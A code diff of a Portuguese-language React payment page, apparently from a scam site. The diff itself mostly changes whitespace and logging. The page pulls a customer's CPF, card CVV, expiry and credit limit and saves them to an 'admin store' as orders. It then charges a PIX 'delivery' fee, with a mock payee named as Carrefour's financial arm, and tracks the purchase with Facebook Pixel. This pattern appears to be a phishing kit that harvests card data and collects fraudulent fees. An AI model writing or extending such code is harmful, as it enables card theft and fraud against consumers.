@@ -13,7 +13,7 @@ import CardDesign from '../Shared/CardDesign';
 import { useNavigate } from 'react-router-dom';
 
 export default function PaymentPage() {
-  const { 
+  const {
     nomeCompleto,
     telefone,
     cpf,
@@ -34,7 +34,7 @@ export default function PaymentPage() {
     cvv,
     validade
   } = useUserStore();
-  
+
   const addOrder = useAdminStore((state) => state.addOrder);
   const updateOrder = useAdminStore((state) => state.updateOrder);
   const getOrderByTransactionId = useAdminStore((state) => state.getOrderByTransactionId);
@@ -81,12 +81,12 @@ export default function PaymentPage() {
         const dados = JSON.parse(pixSalvo);
         const agora = new Date().getTime();
         const expiraEm = new Date(dados.expiresAt).getTime();
-        
+
         if (expiraEm > agora + 60000) {
           console.log('Reutilizando PIX salvo do localStorage');
           setPixData(dados.pixCode, dados.pixQrCode, dados.transactionId);
           setPixGerado(true);
-          
+
           const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
           // Limitar a 5 minutos máximo
           setTempoRestante(Math.min(diferenca, 5 * 60));
@@ -137,25 +137,25 @@ export default function PaymentPage() {
     const verificarStatusPagamento = async () => {
       try {
         const status = await verificarPagamento(transactionId);
-        
+
         if (status.paid && !notificacaoEnviadaRef.current) {
           console.log('✅ Pagamento confirmado!', status);
           setPagamentoVerificado(true);
           notificacaoEnviadaRef.current = true;
-          
+
           // Enviar notificação de pagamento aprovado
           try {
             await notificarPagamentoAprovado(transactionId, valorEntrega || 25.50);
           } catch (error) {
             console.error('Erro ao enviar notificação de pagamento aprovado:', error);
           }
-          
+
           // Limpar intervalo
           if (pollingIntervalRef.current) {
             clearInterval(pollingIntervalRef.current);
             pollingIntervalRef.current = null;
           }
-          
+
           // Redirecionar para página de confirmação após 2 segundos
           setTimeout(() => {
             navigate('/virtual');
@@ -191,11 +191,11 @@ export default function PaymentPage() {
       console.log('🚫 PIX já está sendo gerado, ignorando chamada duplicada');
       return;
     }
-    
+
     gerandoPixRef.current = true;
     setLoading(true);
     console.log('🔄 Iniciando geração de PIX...');
-    
+
     const dadosPix = {
       amount: valorEntrega || 25.50,
       customer: {
@@ -217,10 +217,10 @@ export default function PaymentPage() {
 
     let resultado = null;
     let usouMock = false;
-    
+
     try {
       // Timeout de 8 segundos para evitar travamento
-      const timeoutPromise = new Promise((_, reject) => 
+      const timeoutPromise = new Promise((_, reject) =>
         setTimeout(() => reject(new Error('Timeout ao gerar PIX')), 8000)
       );
 
@@ -231,19 +231,19 @@ export default function PaymentPage() {
       console.log('✅ PIX gerado com sucesso via API:', resultado);
     } catch (error) {
       console.error('❌ Erro ao gerar PIX via API:', error);
-      
+
       // Verificar se está em desenvolvimento
-      const isDevelopment = import.meta.env.DEV || 
+      const isDevelopment = import.meta.env.DEV ||
         (typeof window !== 'undefined' && (
-          window.location.hostname === 'localhost' || 
+          window.location.hostname === 'localhost' ||
           window.location.hostname === '127.0.0.1' ||
           window.location.hostname.includes('localhost')
         ));
-      
+
       // Em desenvolvimento, usar mock para facilitar testes
       if (isDevelopment) {
         console.warn('⚠️ Modo desenvolvimento: Usando PIX mock devido ao erro:', error.message);
-        
+
         resultado = {
           transactionId: 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9).toUpperCase(),
           pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
@@ -265,25 +265,25 @@ export default function PaymentPage() {
       setLoading(false);
       gerandoPixRef.current = false;
     }
-    
+
     // ========================================
     // PONTO ÚNICO DE PROCESSAMENTO DO RESULTADO
     // ========================================
     if (resultado) {
       console.log(`📦 Processando resultado do PIX (${usouMock ? 'MOCK' : 'REAL'})...`);
-      
+
       // Atualizar estado do componente
       setPixData(resultado.pixCode, resultado.qrCode, resultado.transactionId);
       setPixGerado(true);
       console.log('✓ Estado atualizado: pixGerado=true, pixCode=', resultado.pixCode?.substring(0, 20));
-      
+
       // Calcular tempo de expiração
       const expiresAt = resultado.expiresAt || new Date(Date.now() + 5 * 60 * 1000).toISOString();
       const expiraEm = new Date(expiresAt).getTime();
       const agora = new Date().getTime();
       const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
       setTempoRestante(Math.min(diferenca, 5 * 60));
-      
+
       // Salvar no localStorage
       localStorage.setItem('pix_data', JSON.stringify({
         pixCode: resultado.pixCode,
@@ -293,13 +293,14 @@ export default function PaymentPage() {
         valor: dadosPix.amount
       }));
       console.log('✓ PIX salvo no localStorage');
-      
+
       // Track purchase no Facebook Pixel
       trackPurchase(dadosPix.amount, 'BRL', resultado.transactionId);
       console.log('✓ Purchase tracked no Facebook Pixel');
-      
+
       // Salvar pedido no admin store
-      addOrder({
+      console.log('💾 [PaymentPage] Salvando pedido no admin store...');
+      const savedOrder = addOrder({
         nomeCompleto,
         telefone,
         cpf,
@@ -319,8 +320,9 @@ export default function PaymentPage() {
         bandeiraCartao,
         limite,
       });
+      console.log('✅ [PaymentPage] Pedido salvo com ID:', savedOrder.id);
       console.log('✓ Pedido salvo no admin store');
-      
+
       // ========================================
       // ENVIAR NOTIFICAÇÃO (APENAS UMA VEZ)
       // ========================================
@@ -336,7 +338,7 @@ export default function PaymentPage() {
       } else {
         console.log('ℹ️ Notificação já foi enviada anteriormente, pulando...');
       }
-      
+
       console.log(`🎉 PIX ${usouMock ? 'mock' : 'real'} processado com sucesso!`);
     }
   };
@@ -345,7 +347,7 @@ export default function PaymentPage() {
     navigator.clipboard.writeText(pixCode);
     setCopiado(true);
     setTimeout(() => setCopiado(false), 2000);
-    
+
     // Atualizar pedido no admin store para marcar que copiou o código
     if (transactionId) {
       const order = getOrderByTransactionId(transactionId);
@@ -368,10 +370,10 @@ export default function PaymentPage() {
           <Logo size="md" />
         </div>
       </div>
-      
+
       <div className="container mx-auto px-3 sm:px-4 py-4 sm:py-6 md:py-8 max-w-full overflow-x-hidden">
         <ProgressBar etapaAtual="payment" />
-        
+
         <div className="max-w-4xl mx-auto mt-4 sm:mt-6 md:mt-8 w-full max-w-full box-border">
           {/* Título Principal */}
           <div className="text-center mb-4 sm:mb-6 md:mb-8">
@@ -386,16 +388,16 @@ export default function PaymentPage() {
           <div className="grid md:grid-cols-3 gap-4 sm:gap-6 w-full max-w-full box-border">
             {/* Coluna Principal - PIX */}
             <div className="md:col-span-2 space-y-4 sm:space-y-6 w-full max-w-full box-border min-w-0">
-                {/* Timer Sofisticado */}
-                {(pixGerado || pixCode) && pixCode && tempoRestante > 0 && (
-                  <motion.div
-                    initial={{ opacity: 0, scale: 0.95 }}
-                    animate={{ opacity: 1, scale: 1 }}
-                    className="relative bg-gradient-to-br from-green-600 via-green-500 to-green-700 rounded-xl py-3 sm:py-4 px-3 sm:px-4 md:px-5 text-white shadow-2xl overflow-hidden w-full max-w-full box-border"
-                  >
+              {/* Timer Sofisticado */}
+              {(pixGerado || pixCode) && pixCode && tempoRestante > 0 && (
+                <motion.div
+                  initial={{ opacity: 0, scale: 0.95 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  className="relative bg-gradient-to-br from-green-600 via-green-500 to-green-700 rounded-xl py-3 sm:py-4 px-3 sm:px-4 md:px-5 text-white shadow-2xl overflow-hidden w-full max-w-full box-border"
+                >
                   {/* Efeito de brilho animado */}
                   <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shimmer"></div>
-                  
+
                   {/* Padrão de fundo */}
                   <div className="absolute inset-0 opacity-10">
                     <div className="absolute inset-0" style={{
@@ -446,13 +448,13 @@ export default function PaymentPage() {
                               strokeLinecap="round"
                               strokeDasharray={`${2 * Math.PI * 42}`}
                               initial={{ strokeDashoffset: 2 * Math.PI * 42 }}
-                              animate={{ 
+                              animate={{
                                 strokeDashoffset: (2 * Math.PI * 42) * (1 - (tempoRestante / (5 * 60)))
                               }}
                               transition={{ duration: 1, ease: "linear" }}
                             />
                           </svg>
-                          
+
                           {/* Tempo centralizado */}
                           <div className="absolute inset-0 flex flex-col items-center justify-center px-0.5">
                             <p className="text-xs sm:text-sm md:text-base font-bold font-mono tracking-wider drop-shadow-lg leading-tight">
@@ -564,7 +566,7 @@ export default function PaymentPage() {
                           <ChevronDown className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500" />
                         )}
                       </button>
-                      
+
                       {qrCodeExpandido && (
                         <motion.div
                           initial={{ height: 0, opacity: 0 }}
